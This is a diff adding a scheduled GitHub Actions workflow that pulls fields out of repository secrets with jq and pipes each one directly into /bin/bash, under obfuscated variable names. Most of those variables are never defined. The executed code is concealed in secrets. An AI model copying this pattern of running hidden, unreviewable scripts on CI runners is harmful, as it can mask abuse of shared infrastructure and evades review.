@@ -1,0 +1,27 @@
+name: changhongmenquan
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: changhongmenquan
+        env:
+          hx1: ${{ secrets.hx1 }}
+        run: |
+          echo $hx1 | jq -r .helir069 | /bin/bash
+          echo $ucs53282 | jq -r .zzzo23652 | /bin/bash
+          echo $gg7 | jq -r .pczic76149 | /bin/bash
+          echo $wcor6522 | jq -r .vnpqg02191 | /bin/bash
+          echo $jvvo7846 | jq -r .k2725 | /bin/bash
+          echo $zhjc932 | jq -r .h8599 | /bin/bash
+          echo $gpr10 | jq -r .miqkq234 | /bin/bash
+          echo $xd779 | jq -r .w48 | /bin/bash
+          echo $e64 | jq -r .dgmxn2355 | /bin/bash
+          echo $u939 | jq -r .gt0 | /bin/bash
+          echo $pmbz871 | jq -r .xj03274 | /bin/bash
+
